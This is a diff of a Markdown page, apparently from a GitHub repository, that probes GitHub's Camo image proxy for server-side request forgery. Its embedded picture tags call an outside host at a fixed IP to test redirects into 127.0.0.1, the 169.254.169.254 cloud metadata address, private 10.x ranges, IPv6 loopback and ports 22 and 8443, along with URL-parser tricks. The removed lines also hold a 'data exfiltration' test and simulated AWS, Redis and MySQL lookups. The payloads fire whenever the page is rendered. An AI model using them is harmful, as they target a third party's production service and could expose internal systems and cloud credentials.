@@ -1,72 +1,58 @@
-# 🔍 SSRF Validation Tests
+## GitHub Camo Probe (safe tests I own)
 
-Testing GitHub Camo proxy SSRF vulnerability.
+> All URLs point to my test box at `http://164.90.187.218:8080`.  
+> These images are intentionally broken/slow/large to exercise the proxy.
 
-## Basic SSRF Confirmation
+### 1) Baseline fetch
+<img alt="t1-basic" src="http://164.90.187.218:8080/ssrf-test-1-basic?nonce=1" />
+
+### 2) Slow & Large (timeout/limits)
+<img alt="t2-slow-30s" src="http://164.90.187.218:8080/ssrf-test-7-slow?duration=30&nonce=2" />
+<img alt="t3-large-50mb" src="http://164.90.187.218:8080/ssrf-test-6-large?size=50&nonce=3" />
+
+### 3) Redirect chains (what will camo follow?)
+<!-- external->external (should follow) -->
 <picture>
-  <source srcset="https://oob.example.com/ssrf-test-1">
-  <img src="fallback.jpg" alt="Test 1">
+  <source srcset="http://164.90.187.218:8080/ssrf-test-5-redirect?step=1&nonce=4">
+  <img alt="ext->ext" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
 </picture>
 
-## Timing Attack Test  
+<!-- external->internal (should be blocked if protections work) -->
 <picture>
-  <source srcset="http://164.90.187.218:8080/ssrf-test-2-timing?delay=10">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Timing Test">
-</picture>
-
-## Data Exfiltration Test
-<picture>
-  <source srcset="http://164.90.187.218:8080/ssrf-test-3-data?data=github-internal-secret">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Data Test">
-</picture>
-
-## Header Analysis Test
-<picture>
-  <source srcset="http://164.90.187.218:8080/ssrf-test-4-headers">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Header Test">
-</picture>
-
-## Redirect Following Test
-<picture>
-  <source srcset="http://164.90.187.218:8080/ssrf-test-5-redirect?step=1">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Redirect Test">
-</picture>
-
-## Large Response Test (50MB)
-<picture>
-  <source srcset="http://164.90.187.218:8080/ssrf-test-6-large?size=50">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Large Test">
-</picture>
-
-## Slow Response Test (30s)
-<picture>
-  <source srcset="http://164.90.187.218:8080/ssrf-test-7-slow?duration=30">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Slow Test">
-</picture>
-
-## Protocol Confusion Tests
-<picture>
-  <source srcset="http://164.90.187.218:8080/ssrf-test-8-protocols?protocol=ftp">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="FTP Test">
+  <source srcset="http://164.90.187.218:8080/redirect-to-internal?case=localhost&nonce=5">
+  <img alt="ext->127.0.0.1" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
 </picture>
 
 <picture>
-  <source srcset="http://164.90.187.218:8080/ssrf-test-8-protocols?protocol=ldap">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="LDAP Test">
-</picture>
-
-## Internal Service Simulation
-<picture>
-  <source srcset="http://164.90.187.218:8080/simulate-internal?service=aws-metadata">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="AWS Test">
+  <source srcset="http://164.90.187.218:8080/redirect-to-internal?case=metadata&nonce=6">
+  <img alt="ext->169.254.169.254" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
 </picture>
 
 <picture>
-  <source srcset="http://164.90.187.218:8080/simulate-internal?service=redis-info">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Redis Test">
+  <source srcset="http://164.90.187.218:8080/redirect-to-internal?case=rfc1918-10&nonce=7">
+  <img alt="ext->10.0.0.1" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
+</picture>
+
+### 4) URL parser edge cases
+<!-- userinfo trick: which host is honored? -->
+<picture>
+  <source srcset="http://164.90.187.218:8080/redirect-to-edge?case=userinfo-host-swap&nonce=8">
+  <img alt="userinfo-host-swap" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
+</picture>
+
+<!-- IPv6 localhost -->
+<picture>
+  <source srcset="http://164.90.187.218:8080/redirect-to-edge?case=ipv6-loopback&nonce=9">
+  <img alt="[::1]" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
+</picture>
+
+### 5) Non-standard ports (small sample; do not scan)
+<picture>
+  <source srcset="http://164.90.187.218:8080/redirect-to-port?port=22&nonce=10">
+  <img alt="port-22" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
 </picture>
 
 <picture>
-  <source srcset="http://164.90.187.218:8080/simulate-internal?service=mysql-status">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="MySQL Test">
+  <source srcset="http://164.90.187.218:8080/redirect-to-port?port=8443&nonce=11">
+  <img alt="port-8443" src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />
 </picture>
